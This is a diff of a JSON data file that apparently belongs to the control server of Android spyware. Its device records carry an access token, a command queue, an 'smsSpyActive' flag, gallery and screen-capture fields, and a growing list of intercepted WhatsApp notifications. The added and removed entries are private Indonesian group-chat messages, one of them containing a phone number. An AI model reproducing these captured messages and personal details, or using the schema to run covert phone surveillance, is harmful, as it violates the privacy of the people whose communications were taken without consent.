@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775044407489,
+    "lastSeen": 1775044410484,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13130 pesan): ~ r",
+        "content": "lagi",
+        "time": "01/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044410849
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15395 pesan dari 10 chat",
+        "time": "01/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044409164
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13129 pesan): ~ Fegg",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:44",
         "pkg": "com.whatsapp",
         "receivedAt": 1775043881615
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15241 pesan dari 10 chat",
-        "time": "01/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043881581
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15240 pesan dari 10 chat",
-        "time": "01/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043880567
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15396 pesan dari 10 chat",
+        "time": "01/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044410935
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎🇫🇮GB OPTEST XEMETRIX ELITE🇫🇮 (49 pesan): ~ ?",
+        "content": "📷 gg @⁨+62 813-1935-3554⁩",
+        "time": "01/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044409119
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15395 pesan dari 10 chat",
+        "time": "01/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044409106
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13129 pesan): ~ Fegg",
@@ -8040,30 +8064,6 @@
         "time": "01/04 19:44",
         "pkg": "com.whatsapp",
         "receivedAt": 1775043881599
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12967 pesan): ~ Bot",
-        "content": "💟 Stiker",
-        "time": "01/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043881568
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12966 pesan): ~ Bot",
-        "content": "🎵 Pesan suara (0.17)",
-        "time": "01/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043880613
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15240 pesan dari 10 chat",
-        "time": "01/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043880581
       }
     ],
     "galleryPhotos": [],
